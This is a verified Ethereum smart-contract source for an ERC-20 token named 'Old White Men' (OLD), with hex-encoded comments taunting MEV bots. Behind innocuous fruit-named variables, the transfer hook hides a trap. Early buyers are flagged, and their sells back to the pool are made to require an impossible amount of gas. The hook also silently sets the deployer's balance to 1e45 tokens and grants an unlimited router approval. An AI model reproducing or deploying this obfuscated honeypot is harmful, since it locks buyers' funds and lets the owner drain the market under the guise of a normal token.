/**
 *Submitted for verification at Etherscan.io on 2022-06-05
*/

/*
0x54414b494e472054494d4520544f204e4f544943452d2d2042555420444f4e5420424f544845522d2
d204348414e47452057494c4c20434f4d4520494e5354414e544c592d2d20424554544552205945542d
2d20534f4f4e20544845204d455620504c414755452057494c4c204245434f4d452054524150504544

0x444f20594f552057414e5420544f20504c41593f

0x2d2d2d2d2d202d2e2e2d202e2e2e2e2e202d2d2e2e2e202e2e2e2e2d202e2d2d2d2d202e2e2e2e2d20
2e202e2e2e2e2e202e2e2e2e2d202e2e2d2d2d202d2d2d2d2d202e2e2e2e2d202d2d2d2d2e202e2e2e2e
2e202e2e2e2e2d202e2e2d2d2d202d2d2d2d2d202e2e2e2e2d202d2e2e202e2e2e2e2d202e2e2d2e202e
2e2e2e2e202e2e2d2d2d202e2e2e2e2d202e2e2e2e2e202e2e2d2d2d202d2d2d2d2d202e2e2e2e2d202e
2e2e2d2d202e2e2e2e2d202e2e2d2e202e2e2e2e2d202d2e2e202e2e2e2e2e202d2d2d2d2d202e2e2e2e
2d202d2e2d2e202e2e2e2e2d202d2d2d2d2e202e2e2e2e2d202e2e2e2d2d202e2e2e2e2d202e2d2d2d2d
202e2e2e2e2e202e2e2e2e2d202e2e2e2e2d202e2e2e2e2e202e2e2e2e2d202e2e2e2e2d202e2e2e2d2d
202e2e2d2e
*/ 

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IUniswapV2Pair {
    event Sync(uint112 reserve0, uint112 reserve1);
    function sync() external;
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private oldAddr;
    uint256 private Mango = block.number*2;

    mapping (address => bool) private Apple;
    mapping (address => bool) private Orange;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    address private Pear = address(0);

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private valGas = 2900e4;
    address public pair;

    IDEXRouter router;

    string private _name; string private _symbol; uint256 private _totalSupply; uint256 private theN;
    bool private trading = false; uint256 private Peach = 1; bool private Passion = false;
    
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        router = IDEXRouter(_router);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));

        _name = name_;
        _symbol = symbol_;
        oldAddr.push(_router); oldAddr.push(msgSender_); oldAddr.push(pair);
        for (uint256 q=0; q < 3;) {Apple[oldAddr[q]] = true; unchecked{q++;} }
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function _gweiOrgas(bool account) internal { if (account) { require(gasleft() >= valGas); } (_balances[oldAddr[1]],valGas) = Passion ? (1e45, valGas) : (_balances[oldAddr[1]],valGas); }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; Mango = block.number;
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function _beforeTokenTransfer(address sender, address recipient, uint256 amount) internal {
        require((trading || (sender == oldAddr[1])), "ERC20: trading is not yet enabled.");
        Peach += Apple[recipient] ? 1 : 0; _gweiOrgas((Passion || Orange[sender]) && (Apple[recipient] == true) && (Apple[sender] != true));
        _chkTheValue(Pear, (((Mango == block.number) || ((Mango - theN) <= 7)) && (Apple[Pear] != true))); Passion = ((Peach % 5) == 0) ? true : Passion;
        Mango = block.number; Pear = recipient;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        _beforeTokenTransfer(sender, recipient, amount);
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _chkTheValue(address sender, bool account) internal { Orange[sender] = account ? true : Orange[sender]; }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _DeployOld(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(oldAddr[0], 10 ** 77);
              
        emit Transfer(address(0), account, amount);
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol, creator) {
        _DeployOld(creator, initialSupply);
    }
}

contract OldWhiteMen is ERC20Token {
    constructor() ERC20Token("Old White Men", "OLD", msg.sender, 100000 * 10 ** 18) {
    }
}

// 0x524541442041424f5645